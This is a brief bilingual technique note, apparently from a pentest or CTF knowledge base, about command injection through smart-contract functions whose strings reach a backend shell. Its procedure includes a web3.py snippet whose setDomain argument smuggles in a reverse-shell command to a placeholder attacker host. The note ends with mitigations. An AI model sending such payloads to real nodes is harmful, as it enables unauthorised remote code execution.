---
topic: Solidity contracts with command injection
tags: [web, solidity, blockchain, web3, command-injection]
---

# Solidity contracts with command injection

[🌐 Español](solidity-smart-contract-command-injection.md) | **English**

## Concept

A smart contract can expose functions that a backend executes with user data. If a function passes a string to a shell or system command, interacting with the contract becomes remote execution.

## When it applies

- An Ethereum or JSON-RPC node is exposed.
- The contract ABI and address are accessible.
- A function receives a string used by the backend.

## Procedure

1. Download the contract ABI and address.
2. Connect to the node with `web3.py`.
3. Identify the function that uses the string.
4. Send a payload and observe execution.

```python
from web3 import Web3
w3 = Web3(Web3.HTTPProvider('http://<IP>:9810'))
abi = [...]
contract = w3.eth.contract(address='<ADDRESS>', abi=abi)
tx = contract.functions.setDomain('; bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"').transact()
```

## Variants

- Use `cast` or `eth_sendTransaction` directly.
- Inject into a field written to logs.
- Combine with an SSH key found in IPFS.

## Limitations

- The function must reach a system command.
- The node must allow transactions.
- The ABI must be correct.

## Mitigation and detection

- Do not run contracts with shell access.
- Validate and escape strings before use.
- Isolate the node and restrict the public ABI.

## References

- <https://docs.soliditylang.org/>
- <https://web3py.readthedocs.io/>
- <https://attack.mitre.org/techniques/T1059/004/>
